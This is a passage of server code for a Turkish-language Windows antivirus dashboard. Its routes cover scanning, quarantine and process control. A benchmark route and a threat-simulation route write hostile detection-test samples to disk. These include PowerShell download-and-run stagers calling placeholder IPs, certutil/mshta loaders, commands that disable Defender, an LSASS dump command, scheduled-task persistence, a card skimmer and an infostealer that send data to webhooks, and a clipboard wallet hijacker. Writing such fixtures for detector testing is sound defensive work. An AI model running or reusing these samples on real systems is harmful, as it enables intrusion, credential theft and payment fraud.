    } catch (err) {
      return sendJson(res, 500, { error: err.message });
    }
  }

  // System Optimizer / Cleanup
  if (pathname === '/api/pro/optimize' && req.method === 'POST') {
    const result = await runSystemOptimizer();
    logEvent(
      'Sistem Güçlendirici',
      `Sistem Optimize Edildi (${result.freedMb} MB Temizlendi)`,
      `DNS önbelleği yenilendi, boş bellek ${result.freeMemoryMb} MB, sertleştirme skoru ${result.hardeningScore}/100.`,
      'SAFE',
      'Sistem Geneli (Tüm Diskler)',
      'Optimize Edildi',
      { threatLevel: 'Güvenli' }
    );
    return sendJson(res, 200, result);
  }

  // Windows Startup & Registry RAT Persistence Audit
  if (pathname === '/api/plus/startup-guard' && req.method === 'GET') {
    const reply = await queryVortexDaemon('startup_audit', {}, 8000);
    return sendJson(res, 200, {
      engine: ENGINE_NAME,
      entries: reply?.entries || []
    });
  }

  // Kill Malicious Process + Immediately Quarantine Executable
  if (pathname === '/api/pro/kill-and-quarantine' && req.method === 'POST') {
    const body = await parseBody(req);
    const pid = Number(body.pid);
    const exePath = body.filePath ? String(body.filePath) : '';
    if (!Number.isInteger(pid) || isProtectedServicePid(pid)) {
      return sendJson(res, 403, { error: 'Geçersiz, sistem kritik veya AegisCore öz-koruma altındaki PID durdurulamaz.' });
    }
    let killed = false;
    try {
      process.kill(pid, 'SIGKILL');
      killed = true;
    } catch (err) {
      return sendJson(res, 500, { error: `Süreç sonlandırılamadı: ${err.message}` });
    }
    let qRes = { success: false };
    if (exePath && fs.existsSync(exePath) && !exePath.toLowerCase().includes('\\windows\\system32\\')) {
      qRes = quarantineFile(exePath, body.threatName || 'RAT.ActiveProcess.Isolated', 95, ['SuperLX 1.0 Ağ/RAT Süreç Müdahalesi']);
    }
    logEvent(
      'Süreç & Karantina',
      `PID ${pid} Durduruldu${qRes.success ? ' ve Karantinaya Alındı' : ''}`,
      exePath || `PID:${pid}`,
      'CRITICAL',
      exePath || `PID:${pid}`,
      qRes.success ? 'İmha & Karantina' : 'Durduruldu',
      { pid, riskScore: 95, threatLevel: 'Kritik', quarantineId: qRes.record?.id || null }
    );
    return sendJson(res, 200, { success: true, killed, quarantined: qRes.success });
  }

  // SuperLX 1.0 Defender & Anti-RAT Live Verification Suite
  if (pathname === '/api/pro/superlx-benchmark' && req.method === 'POST') {
    const zlib = require('zlib');
    const tempDir = path.join(os.tmpdir(), `superlx_bench_${Date.now()}`);
    fs.mkdirSync(tempDir, { recursive: true });
    try {
      const gzipInner = zlib.gzipSync(Buffer.from('Invoke-Expression (New-Object Net.WebClient).DownloadString("http://198.51.100.44/stage2.ps1")', 'utf8')).toString('base64');
      const cases = [
        {
          id: 'html_smuggling',
          label: 'HTML Smuggling & Blob Payload Dropper',
          fileName: 'invoice_viewer.html',
          expected: 'INFECTED',
          content: Buffer.from(`<html><script>var b=atob("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");var u=URL.createObjectURL(new Blob([b]));</script></html>`, 'utf8')
        },
        {
          id: 'gzip_obfuscation',
          label: 'Base64 + GZip + Backtick Gizleme (Evader)',
          fileName: 'obf_stager.ps1',
          expected: 'INFECTED',
          content: Buffer.from(`# Caret + GZip evader\n$p="Invo"+"ke-Ex"+"pression"\n$raw=[System.Convert]::FromBase64String("${gzipInner}")\n`, 'utf8')
        },
        {
          id: 'defender_tamper',
          label: 'Windows Defender Körleştirme & Dışlama İstismarı',
          fileName: 'excl_bypass.ps1',
          expected: 'INFECTED',
          content: Buffer.from(`Add-MpPreference -ExclusionPath "C:\\Users\\Public"; Set-MpPreference -DisableRealtimeMonitoring $true\n`, 'utf8')
        },
        {
          id: 'lolbin_stager',
          label: 'Dosyasız LOLBin Yürütme (Certutil / MSHTA)',
          fileName: 'stage1_lolbin.bat',
          expected: 'INFECTED',
          content: Buffer.from(`@echo off\ncertutil.exe -urlcache -split -f http://203.0.113.99/agent.dll C:\\Users\\Public\\a.dll\nmshta http://203.0.113.99/drop.hta\n`, 'utf8')
        },
        {
          id: 'lsass_earlybird',
          label: 'Comsvcs LSASS Dump & Early-Bird APC Enjeksiyonu',
          fileName: 'mem_dump.ps1',
          expected: 'INFECTED',
          content: Buffer.from(`rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 lsass.dmp full\n# NtMapViewOfSection NtQueueApcThread\n`, 'utf8')
        },
        {
          id: 'polyglot_pdf',
          label: 'Polyglot PDF Arkasına Gömülü Gizli PE',
          fileName: 'brochure.pdf',
          expected: 'INFECTED',
          content: Buffer.concat([Buffer.from('%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n', 'ascii'), Buffer.from('MZ\x90\x00\x03\x00\x00\x00', 'latin1'), Buffer.alloc(48, 0), Buffer.from('PE\x00\x00\x64\x86', 'latin1')])
        },
        {
          id: 'rat_dotnet_crypter',
          label: 'AsyncRAT / DcRat .NET Bellek İçi Şifreli Yükleyici',
          fileName: 'async_crypter.ps1',
          expected: 'INFECTED',
          content: Buffer.from(`# Managed Assembly.Load(bytes) AES RAT Crypter\n$aes = New-Object System.Security.Cryptography.RijndaelManaged\n$asm = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("TVqQ..."))\n$asm.EntryPoint.Invoke($null, $null)\n`, 'utf8')
        },
        {
          id: 'rat_spy_exfil',
          label: 'RAT Casusluk (Keylogger + Ekran/Kamera + Discord C2)',
          fileName: 'spy_agent.cs.txt',
          expected: 'INFECTED',
          content: Buffer.from(`SetWindowsHookEx GetAsyncKeyState CopyFromScreen capCreateCaptureWindow "https://discord.com/api/webhooks/123/abc"\n`, 'utf8')
        },
        {
          id: 'rat_hollowing_pers',
          label: 'RAT Crypter Process Hollowing + Schtasks Kalıcılığı',
          fileName: 'hollow_dropper.bat',
          expected: 'INFECTED',
          content: Buffer.from(`@echo off\nREM ZwUnmapViewOfSection SetThreadContext ResumeThread\nschtasks.exe /create /tn "SysUpdate" /tr "powershell -w hidden C:\\Users\\Public\\r.ps1" /sc onlogon /f\n`, 'utf8')
        },
        {
          id: 'web_clickfix_captcha',
          label: 'Web Virüsü: ClickFix / Sahte CAPTCHA Pano Enjeksiyonu',
          fileName: 'verify_human.html',
          expected: 'INFECTED',
          content: Buffer.from(`<html><script>navigator.clipboard.writeText("mshta https://198.51.100.88/fix.hta");</script><p>Verify you are human: Press Win + R, Ctrl + V</p></html>`, 'utf8')
        },
        {
          id: 'web_cryptojacker',
          label: 'Web Virüsü: Tarayıcı İçi WASM Kripto Madenci (Cryptojacker)',
          fileName: 'miner_widget.js',
          expected: 'INFECTED',
          content: Buffer.from(`var m = new CoinHive.Anonymous("site-key"); m.start(); // stratum+tcp://pool.moneroocean.stream:10128\n`, 'utf8')
        },
        {
          id: 'web_magecart_skimmer',
          label: 'Web Virüsü: Magecart Ödeme Formu Skimmer & Obfuscated JS',
          fileName: 'checkout_patch.js',
          expected: 'INFECTED',
          content: Buffer.from(`var cc=document.querySelector('#cardnumber').value; var cvv=document.querySelector('#cvv2').value; navigator.sendBeacon("https://discord.com/api/webhooks/111/222", btoa(cc+cvv));\n`, 'utf8')
        },
        {
          id: 'vbe_encoded_dropper',
          label: 'Trojan Bypass: MS Script Encoder (.vbe) Gizli Yükleyici',
          fileName: 'invoice_helper.vbe',
          expected: 'INFECTED',
          content: Buffer.from('I0B+XlNRQUFBQT09an9ZfmtQe1BaTSttTyt9NCUrMVljRXE/bU1yd0RSPzRuc1ZyI0AjQCZkUl07CVBFd0tBK00vNG5eVlBSbgltfj81JHdib1RickFoY0FBQT09XiN+QAA=', 'base64')
        },
        {
          id: 'batcloak_obfuscator',
          label: 'Trojan Bypass: BatCloak Substring/Caret Gizli Batch Yükleyici',
          fileName: 'sys_repair.bat',
          expected: 'INFECTED',
          content: Buffer.from(`@echo off\r\nset "k=powershell"\r\n%k:~0,5%%k:~5,5% -w hidden ^I^E^X (New-Object Net.WebClient).DownloadString("http://198.51.100.77/drop.ps1")\r\n`, 'utf8')
        },
        {
          id: 'clipbanker_hijacker',
          label: 'Trojan: Kripto Pano (ClipBanker) Cüzdan Değiştirici',
          fileName: 'clip_hijack.cs.txt',
          expected: 'INFECTED',
          content: Buffer.from(`GetClipboardData(); SetClipboardData("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"); Clipboard.SetText("0x742d35Cc6634C0532925a3b844Bc454e4438f44e");\n`, 'utf8')
        },
        {
          id: 'binary_pumped_trojan',
          label: 'Trojan Bypass: 5.2MB Null-Byte Binary Pumping Gizli PE',
          fileName: 'pumped_agent.bin',
          expected: 'INFECTED',
          content: (() => {
            const head = Buffer.alloc(1024, 0);
            head.write('MZ', 0, 'ascii');
            head.writeUInt32LE(0x80, 0x3C);
            head.write('PE\0\0', 0x80, 'ascii');
            head.writeUInt16LE(0x8664, 0x84);
            head.writeUInt16LE(1, 0x86);
            head.writeUInt16LE(0xF0, 0x94);
            head.writeUInt16LE(0x020B, 0x98);
            head.write('.text\0\0\0', 0x188, 'ascii');
            head.writeUInt32LE(0x200, 0x190);
            head.writeUInt32LE(0x1000, 0x194);
            head.writeUInt32LE(0x200, 0x198);
            head.writeUInt32LE(0x200, 0x19C);
            const payload = Buffer.from('VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0NtAllocateVirtualMemory\0', 'ascii');
            payload.copy(head, 0x220);
            return Buffer.concat([head, Buffer.alloc(5300 * 1024, 0)]);
          })()
        },
        {
          id: 'indirect_syscall_hvnc',
          label: 'Trojan: Hidden VNC + Indirect Syscall Gizli Enjeksiyon',
          fileName: 'hvnc_implant.ps1',
          expected: 'INFECTED',
          content: Buffer.from(`CreateDesktopA("hvnc_sess"); SwitchDesktop(hDesk); PrintWindow(hWnd, hdc, 0); BitBlt(hdc, 0, 0, 1920, 1080, src, 0, 0, 0xCC0020);\n# Direct syscall stub: mov r10, rcx; mov eax, ssn; syscall; ret\nNtAllocateVirtualMemory NtWriteVirtualMemory SetThreadContext ResumeThread\n`, 'utf8')
        },
        {
          id: 'multiapp_infostealer',
          label: 'Trojan: Çoklu Tarayıcı & Kripto Cüzdan InfoStealer',
          fileName: 'stealer_harvest.py',
          expected: 'INFECTED',
          content: Buffer.from(`# Harvester for Login Data, Local State, cookies.sqlite, wallet.dat, Exodus, tdata\nCryptUnprotectData(blob); NSS_Init(profile); post("https://api.telegram.org/bot123456:ABCDEF/sendDocument")\n`, 'utf8')
        },
        {
          id: 'benign_control',
          label: 'Temiz Sistem Kontrol Betiği (Yanlış Pozitif Testi)',
          fileName: 'clean_check.ps1',
          expected: 'CLEAN',
          content: Buffer.from(`# Normal user diagnostic report\nGet-Date\nWrite-Output "System check nominal"\n`, 'utf8')
        }
      ];

      const paths = [];
      for (const tc of cases) {
        const fp = path.join(tempDir, tc.fileName);
        fs.writeFileSync(fp, tc.content);
        paths.push(fp);
      }

      const batchReply = vortexLiveState.daemonActive
        ? await queryVortexDaemon('batch_inspect', { paths, tier: 'pro' }, 15000)
        : null;
      const batchByPath = new Map((batchReply?.results || []).map(r => [r.path, r]));

      const results = [];
      for (let i = 0; i < cases.length; i++) {
        const tc = cases[i];
        const fp = paths[i];
        const r = batchByPath.get(fp) || await runSuperLXAnalyzer(fp, 'pro');
        const passed = r.status === tc.expected;
        results.push({
          id: tc.id,
          label: tc.label,
          fileName: tc.fileName,
          expected: tc.expected,
          actual: r.status,
          score: r.risk_score,
          stage: r.detection_stage,
          blindSpots: r.blind_spots_caught || [],
          passed
        });
      }

      const passedCount = results.filter(x => x.passed).length;
      logEvent(
        'SuperLX 1.0 Anti-RAT Test',
        `SuperLX 1.0 Doğrulama: ${passedCount}/${results.length} Test Başarılı`,
        'Anti-RAT (AsyncRAT/Crypter/Hollowing/Keylogger+Webhook), HTML Smuggling, GZip Evader, Defender Tamper ve LOLBin testleri tamamlandı.',
        passedCount === results.length ? 'SAFE' : 'WARNING',
        'SuperLX 1.0 Doğrulama Motoru',
        passedCount === results.length ? 'Tümü Geçti' : 'Kısmi Başarı'
      );
      return sendJson(res, 200, { engine: 'SuperLX 1.0', passedCount, totalCount: results.length, results });
    } catch (err) {
      return sendJson(res, 500, { error: err.message });
    } finally {
      try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch (_) {}
    }
  }

  // Atomic Time Machine Snapshot & LIFO Rollback
  if (pathname === '/api/timemachine/snapshot' && req.method === 'GET') {
    const reply = await queryVortexDaemon('timemachine_snapshot');
    return sendJson(res, 200, { entries: reply?.entries || [] });
  }

  if (pathname === '/api/timemachine/rollback' && req.method === 'POST') {
    const body = await parseBody(req);
    const reply = await queryVortexDaemon('timemachine_rollback', { pid: Number(body.pid || 0) });
    const summary = reply?.summary || { pid: 0, entries_processed: 0, files_deleted: [], files_restored: [], registry_reverted: [] };
    logEvent(
      'Atomik Geri Sarma',
      `Zaman Makinesi Geri Sarma Tamamlandı (${summary.entries_processed} işlem)`,
      `${summary.files_restored.length} dosya kurtarıldı, ${summary.files_deleted.length} şüpheli kalıntı temizlendi.`,
      'SAFE',
      'Gölge Günlük Kasası',
      'Geri Sarıldı'
    );
    return sendJson(res, 200, summary);
  }

  // Drag & Drop File Upload Scan (Unified 500 MB streaming SuperLX 1.0 capacity)
  if (pathname === '/api/scan-upload' && req.method === 'POST') {
    const limitMb = MAX_UPLOAD_LIMIT_MB;
    const limitBytes = MAX_UPLOAD_LIMIT_BYTES;
    const contentType = (req.headers['content-type'] || '').toLowerCase();

    const tempDropDir = path.join(os.tmpdir(), `aegis_drop_${Date.now()}_${crypto.randomInt(1000, 9999)}`);
    let safeName = 'uploaded_sample.bin';
    let tempScanFile = '';

    try {
      fs.mkdirSync(tempDropDir, { recursive: true });

      if (contentType.includes('application/octet-stream')) {
        let rawHdrName = 'uploaded_sample.bin';
        if (req.headers['x-file-name']) {
          try {
            rawHdrName = decodeURIComponent(String(req.headers['x-file-name']));
          } catch (_) {
            fs.rmSync(tempDropDir, { recursive: true, force: true });
            return sendJson(res, 400, { error: 'Geçersiz dosya adı kodlaması.' });
          }
        }
        safeName = path.basename(rawHdrName).replace(/[^\w.\-() ]/g, '_').replace(/^\.+/, '') || 'sample.bin';
        tempScanFile = path.join(tempDropDir, safeName);

        const declaredLen = Number(req.headers['content-length'] || 0);
        if (declaredLen > limitBytes) {
          if (declaredLen <= limitBytes + 32 * 1024 * 1024) {
            await new Promise(r => { req.resume(); req.once('end', r); setTimeout(r, 800); });
          }
          fs.rmSync(tempDropDir, { recursive: true, force: true });
          return sendJson(res, 413, {
            error: `Dosya boyutu maksimum analiz sınırını (${limitMb} MB) aşıyor.`,
            limitMb
          });
        }

        await new Promise((resolve, reject) => {
          let received = 0;
          let aborted = false;
          const ws = fs.createWriteStream(tempScanFile);
          req.on('data', chunk => {
            received += chunk.length;
            if (received > limitBytes && !aborted) {
              aborted = true;
              ws.destroy();
              req.destroy();
              reject(Object.assign(new Error(`Dosya boyutu ${limitMb} MB analiz sınırını aştı.`), { statusCode: 413 }));
              return;
            }
            if (!aborted) ws.write(chunk);
          });
          req.on('end', () => {
            if (!aborted) ws.end(() => resolve());
          });
          req.on('error', reject);
        });
      } else {
        const body = await parseBody(req, Math.min(limitBytes * 2 + 1024 * 1024, 150 * 1024 * 1024));
        if (!body.fileName || !body.base64Data) {
          fs.rmSync(tempDropDir, { recursive: true, force: true });
          return sendJson(res, 400, { error: 'Geçerli bir dosya yüklenmedi.' });
        }
        safeName = path.basename(String(body.fileName)).replace(/[^\w.\-() ]/g, '_').replace(/^\.+/, '') || 'sample.bin';
        tempScanFile = path.join(tempDropDir, safeName);
        const fileBuf = Buffer.from(body.base64Data, 'base64');
        if (fileBuf.length > limitBytes) {
          fs.rmSync(tempDropDir, { recursive: true, force: true });
          return sendJson(res, 413, {
            error: `Dosya boyutu maksimum analiz sınırını (${limitMb} MB) aşıyor.`,
            limitMb
          });
        }
        fs.writeFileSync(tempScanFile, fileBuf);
      }

      const verdict = await inspectFileDual(tempScanFile, true);
      stats.totalFilesScanned++;

      if (verdict) {
        verdict.file_name = safeName;
        verdict.upload_limit_mb = limitMb;
        logEvent(
          verdict.status === 'CLEAN' ? 'Sürükle-Bırak Taraması' : 'Davranışsal Tehdit Tespiti',
          verdict.status === 'CLEAN' ? `Dosya Temiz: ${safeName}` : `Tehdit Bulundu: ${verdict.threat_name}`,
          `${verdict.engine || ENGINE_NAME} · ${verdict.detection_stage || 'Çok Aşamalı Analiz'} · Risk: ${verdict.risk_score}/100`,
          verdict.status === 'CLEAN' ? 'SAFE' : 'CRITICAL',
          safeName,
          verdict.status === 'CLEAN' ? 'Temiz' : 'Tehdit Tespit Edildi',
          {
            sha256: verdict.sha256,
            riskScore: verdict.risk_score,
            threatLevel: verdict.status === 'CLEAN' ? 'Güvenli' : 'Kritik',
            engineDecision: verdict.findings.join(' | ') || 'Tehdit kalıbına rastlanmadı.'
          }
        );
      }

      try { fs.rmSync(tempDropDir, { recursive: true, force: true }); } catch (_) {}
      return sendJson(res, 200, verdict || { error: 'Analiz başarısız.' });
    } catch (err) {
      try { fs.rmSync(tempDropDir, { recursive: true, force: true }); } catch (_) {}
      return sendJson(res, err.statusCode || 500, {
        error: err.message,
        limitMb
      });
    }
  }

  if (pathname === '/api/analyze-file' && req.method === 'POST') {
    const body = await parseBody(req);
    if (body.filePath && isUncPath(String(body.filePath))) {
      return sendJson(res, 400, { error: 'Ağ paylaşım (UNC) yolları güvenlik nedeniyle reddedildi.' });
    }
    const target = body.filePath ? path.resolve(String(body.filePath)) : '';
    if (!target || !fs.existsSync(target) || !fs.statSync(target).isFile()) {
      return sendJson(res, 400, { error: 'Dosya bulunamadı.' });
    }
    try {
      const verdict = await inspectFileDual(target, true, true);
      return sendJson(res, 200, verdict);
    } catch (err) {
      return sendJson(res, 500, { error: err.message });
    }
  }

  // Open File Location in Windows Explorer
  if (pathname === '/api/open-location' && req.method === 'POST') {
    const body = await parseBody(req);
    const targetPath = body.filePath ? String(body.filePath).trim() : '';
    if (
      !targetPath
      || targetPath.startsWith('Sistem Geneli')
      || targetPath === '-'
      || isUncPath(targetPath)
      || /[\x00-\x1f,]|^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//i.test(targetPath)
      || /^shell:/i.test(targetPath)
    ) {
      return sendJson(res, 400, { error: 'Geçersiz veya güvenlik nedeniyle engellenen konum.' });
    }

    const resolved = path.resolve(targetPath);
    if (fs.existsSync(resolved)) {
      const lst = fs.lstatSync(resolved);
      if (lst.isSymbolicLink()) {
        return sendJson(res, 400, { error: 'Sembolik bağ hedefi açılamaz.' });
      }
      execFile('explorer.exe', [`/select,${resolved}`], () => {});
      return sendJson(res, 200, { success: true });
    }
    const parent = path.dirname(resolved);
    if (fs.existsSync(parent) && fs.statSync(parent).isDirectory() && !fs.lstatSync(parent).isSymbolicLink()) {
      execFile('explorer.exe', [parent], () => {});
      return sendJson(res, 200, { success: true });
    }
    return sendJson(res, 404, { error: 'Dosya veya üst klasör bulunamadı.' });
  }

  if (pathname === '/api/procnet' && req.method === 'GET') {
    try {
      const report = await runCSharpScanner('procnet');
      return sendJson(res, 200, report);
    } catch (err) {
      return sendJson(res, 500, { error: err.message });
    }
  }

  if (pathname === '/api/kill-process' && req.method === 'POST') {
    const body = await parseBody(req);
    const pid = Number(body.pid);
    if (!Number.isInteger(pid) || isProtectedServicePid(pid)) {
      return sendJson(res, 403, { error: 'Geçersiz, sistem kritik veya AegisCore öz-koruma altındaki PID durdurulamaz.' });
    }
    try {
      process.kill(pid, 'SIGKILL');
      logEvent('Süreç Müdahalesi', `Süreç Sonlandırıldı (PID: ${pid})`, 'Güvenlik duvarı üzerinden süreç durduruldu.', 'WARNING', `PID:${pid}`, 'Durduruldu', { pid });
      return sendJson(res, 200, { success: true });
    } catch (err) {
      return sendJson(res, 500, { error: `Süreç sonlandırılamadı: ${err.message}` });
    }
  }

  if (pathname === '/api/quarantine' && req.method === 'GET') {
    return sendJson(res, 200, getQuarantineList());
  }

  if (pathname === '/api/quarantine/isolate' && req.method === 'POST') {
    const body = await parseBody(req);
    const resObj = quarantineFile(body.filePath, body.threatName, body.riskScore, body.reasons);
    return sendJson(res, resObj.success ? 200 : 400, resObj);
  }

  if (pathname === '/api/quarantine/restore' && req.method === 'POST') {
    const body = await parseBody(req);
    const resObj = restoreQuarantinedFile(body.id);
    return sendJson(res, resObj.success ? 200 : 400, resObj);
  }

  if (pathname === '/api/quarantine/delete' && req.method === 'POST') {
    const body = await parseBody(req);
    const resObj = deleteQuarantinedFile(body.id);
    return sendJson(res, resObj.success ? 200 : 400, resObj);
  }

  if (pathname === '/api/quarantine/isolate-batch' && req.method === 'POST') {
    const body = await parseBody(req);
    const items = Array.isArray(body.items) ? body.items.slice(0, 100) : [];
    const results = [];
    let quarantinedCount = 0;
    for (const entry of items) {
      if (!entry || !entry.filePath) continue;
      const r = quarantineFile(entry.filePath, entry.threatName, entry.riskScore, entry.reasons);
      results.push({ filePath: entry.filePath, ...r });
      if (r.success) quarantinedCount++;
    }
    return sendJson(res, 200, { success: true, quarantinedCount, results });
  }

  if (pathname === '/api/quarantine/purge' && req.method === 'POST') {
    const list = getQuarantineList();
    let deletedCount = 0;
    for (const item of list) {
      const vaultFilePath = resolveSafeVaultFile(item?.vaultFile);
      if (!vaultFilePath) continue;
      try {
        if (fs.existsSync(vaultFilePath)) fs.unlinkSync(vaultFilePath);
        deletedCount++;
      } catch (_) {}
    }
    saveQuarantineList([]);
    if (deletedCount > 0) {
      logEvent(
        'Kalıcı Tehdit İmhası',
        `Karantina Kasası Temizlendi (${deletedCount} Öğe)`,
        'Tüm şifreli karantina kayıtları kalıcı olarak imha edildi.',
        'INFO',
        QUARANTINE_DIR,
        'Temizlendi'
      );
    }
    broadcastSSE('quarantine_updated', []);
    return sendJson(res, 200, { success: true, deletedCount });
  }

  if (pathname === '/api/shield' && req.method === 'POST') {
    const body = await parseBody(req);
    if (typeof body.realtimeEnabled === 'boolean') realtimeEnabled = body.realtimeEnabled;
    if (typeof body.watchDownloads === 'boolean') watchDownloads = body.watchDownloads;
    if (typeof body.networkProtectionEnabled === 'boolean') networkProtectionEnabled = body.networkProtectionEnabled;
    if (typeof body.webProtectionEnabled === 'boolean') webProtectionEnabled = body.webProtectionEnabled;
    if (typeof body.gameMode === 'boolean') gameMode = body.gameMode;
    if (typeof body.autoQuarantine === 'boolean') autoQuarantine = body.autoQuarantine;
    if (body.watchedPath && typeof body.watchedPath === 'string' && !isUncPath(body.watchedPath)) {
      const candidateWatch = path.resolve(body.watchedPath);
      if (fs.existsSync(candidateWatch) && fs.statSync(candidateWatch).isDirectory() && !isProtectedCriticalPath(candidateWatch)) {
        watchedPath = candidateWatch;
      }
    }
    saveShieldConfig();
    startRealtimeWatchers();
    queryVortexDaemon('set_policy', { realtime_enabled: realtimeEnabled, auto_quarantine: autoQuarantine }).catch(() => {});
    logEvent(
      'Koruma Politikası',
      gameMode ? 'Oyun / Rahatsız Etme Modu Etkinleştirildi' : 'Koruma modülleri güncellendi',
      gameMode ? 'Bildirimler ve planlı taramalar duraklatıldı.' : `Dosya: ${realtimeEnabled ? 'Açık' : 'Kapalı'}, Ağ: ${networkProtectionEnabled ? 'Açık' : 'Kapalı'}, Web: ${webProtectionEnabled ? 'Açık' : 'Kapalı'}`,
      'INFO',
      'Çekirdek Koruma Servisleri',
      'Uygulandı'
    );
    return sendJson(res, 200, { realtimeEnabled, watchDownloads, networkProtectionEnabled, webProtectionEnabled, gameMode, autoQuarantine, watchedPath, watchedZones });
  }

  // Read-only Windows Security Center / Defender Coexistence Status (cached 45s)
  if (pathname === '/api/defender-status' && req.method === 'GET') {
    const now = Date.now();
    const agentRssMb = Number((process.memoryUsage().rss / (1024 * 1024)).toFixed(1));
    const buildPayload = (avProducts) => {
      const list = Array.isArray(avProducts) ? avProducts : (avProducts ? [avProducts] : []);
      const defItem = list.find(x => String(x?.displayName || '').toLowerCase().includes('defender'));
      const stateNum = Number(defItem?.productState || 0);
      const defenderActive = defItem ? ((stateNum & 0x1000) !== 0 || (stateNum >= 393216 && stateNum < 409600)) : false;
      return {
        avProducts: list,
        defenderActive,
        primaryShieldReady: Boolean(realtimeEnabled && vortexLiveState.daemonActive && csharpDaemonReady),
        activeLayersCount: 8,
        agentMemoryMb: agentRssMb,
        agentCpuPercent: currentCpuPercent,
        avgInspectMs: perfMetrics.avgInspectMs,
        cacheHits: perfMetrics.cacheHits
      };
    };

    if (defenderStatusCache.data && now - defenderStatusCache.at < 180000) {
      return sendJson(res, 200, buildPayload(defenderStatusCache.data));
    }

    return execFile(
      'powershell.exe',
      [
        '-NoProfile',
        '-Command',
        '[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName, productState, pathToSignedProductExe | ConvertTo-Json -Compress'
      ],
      { timeout: 4500, windowsHide: true },
      (err, stdout) => {
        let parsed = [];
        if (!err && stdout && stdout.trim()) {
          try {
            const raw = JSON.parse(stdout.trim());
            parsed = Array.isArray(raw) ? raw : [raw];
            defenderStatusCache = { at: Date.now(), data: parsed };
          } catch (_) {}
        }
        return sendJson(res, 200, buildPayload(parsed));
      }
    );
  }

  if (pathname === '/api/open-windows-security' && req.method === 'POST') {
    execFile('explorer.exe', ['windowsdefender:'], { windowsHide: false }, () => {});
    return sendJson(res, 200, { success: true });
  }

  // Live Website Virus / Phishing / Drive-By URL Analyzer
  if (pathname === '/api/web-shield/check-url' && req.method === 'POST') {
    const body = await parseBody(req);
    const rawUrl = String(body.url || '').trim();
    if (!rawUrl || rawUrl.length > 2048) {
      return sendJson(res, 400, { error: 'Lütfen geçerli bir web sitesi veya bağlantı (URL) girin.' });
    }
    const report = analyzeWebUrl(rawUrl);
    if (report.status !== 'CLEAN') {
      stats.realtimeInterceptions++;
      logEvent(
        'Web Virüs Kalkanı',
        `Tehlikeli Web Bağlantısı: ${report.threatName}`,
        `${report.url.slice(0, 140)} · Risk: ${report.riskScore}/100 · ${report.reasons[0] || ''}`,
        report.status === 'INFECTED' ? 'CRITICAL' : 'WARNING',
        report.url.slice(0, 180),
        report.status === 'INFECTED' ? 'Engellendi' : 'Şüpheli',
        { riskScore: report.riskScore, threatLevel: report.status === 'INFECTED' ? 'Kritik' : 'Orta', engineDecision: report.reasons.join(' | ') }
      );
    }
    return sendJson(res, 200, { webProtectionEnabled, ...report });
  }

  if (pathname === '/api/security-audit' && req.method === 'GET') {
    return sendJson(res, 200, {
      loopbackBound: true,
      csrfGuard: true,
      sessionTokenGuard: true,
      strictCspNoInlineScript: true,
      symlinkTraversalGuard: true,
      dnsRebindingGuard: true,
      zeroExecShadowCage: true,
      webVirusShieldActive: webProtectionEnabled,
      ransomwareBurstGuardActive: realtimeEnabled,
      csprngVaultKey: fs.existsSync(VAULT_KEY_PATH),
      selfDefenseGuard: true,
      activeHardeningChecks: 13
    });
  }

  // Realistic Verification Triggers
  if (pathname === '/api/simulate-threat' && req.method === 'POST') {
    const body = await parseBody(req);
    const simType = String(body.type || 'eicar');
    const ALLOWED_SIM_TYPES = new Set(['eicar', 'dll_sim', 'ransom_sim', 'injection_sim']);
    if (!ALLOWED_SIM_TYPES.has(simType)) {
      return sendJson(res, 400, { error: 'Geçersiz doğrulama simülasyon türü.' });
    }
    const targetFolder = body.inProtectedZone ? watchedPath : path.join(ROOT_DIR, 'test_samples');
    if (!fs.existsSync(targetFolder)) fs.mkdirSync(targetFolder, { recursive: true });

    let fileName = '';
    let content = '';

    if (simType === 'eicar') {
      fileName = `eicar_standard_test_${Date.now().toString().slice(-4)}.com`;
      const p1 = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$';
      const p2 = 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
      content = p1 + p2;
    } else if (simType === 'dll_sim') {
      fileName = 'mimilib.dll';
      content = 'MZ\x90\x00 Diagnostic Malicious DLL Verification Payload - Mimikatz SSP Probe\n';
    } else if (simType === 'ransom_sim') {
      fileName = `invoice_document_${Date.now().toString().slice(-4)}.pdf.bat`;
      content = `@echo off\nREM vssadmin delete shadows /all /quiet\nREM YOUR FILES HAVE BEEN ENCRYPTED\necho Diagnostic check\n`;
    } else if (simType === 'injection_sim') {
      fileName = `powershell_loader_${Date.now().toString().slice(-4)}.ps1`;
      const b64Payload = Buffer.from('Invoke-Expression (New-Object Net.WebClient).DownloadString("http://198.51.100.12/loader.ps1")', 'utf8').toString('base64');
      content = `# Trojan.PowerShell.Injector diagnostic signature\n# VirtualAllocEx WriteProcessMemory CreateRemoteThread AmsiScanBuffer\n# powershell -nop -w hidden -enc ${b64Payload}\n`;
    }

    const fullFilePath = path.join(targetFolder, fileName);
    fs.writeFileSync(fullFilePath, content, 'utf8');

    return sendJson(res, 200, { success: true, filePath: fullFilePath, fileName, targetFolder });
  }

  let decodedPath = '/';
  try {
    decodedPath = decodeURIComponent(pathname);
  } catch (_) {
    res.writeHead(400);
    return res.end('Bad Request');
  }
  const resolvedPublic = path.resolve(PUBLIC_DIR);
  const filePath = decodedPath === '/'
    ? path.join(resolvedPublic, 'index.html')
    : path.resolve(resolvedPublic, '.' + decodedPath);
  const pubLower = resolvedPublic.toLowerCase();
  const fileLower = filePath.toLowerCase();
  if (fileLower !== pubLower && !fileLower.startsWith(pubLower + path.sep)) {
    res.writeHead(403);
    return res.end('Forbidden');
  }

  if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
    const ext = path.extname(filePath).toLowerCase();
    const mimeTypes = {
      '.html': 'text/html; charset=utf-8',
      '.css': 'text/css; charset=utf-8',
      '.js': 'application/javascript; charset=utf-8',
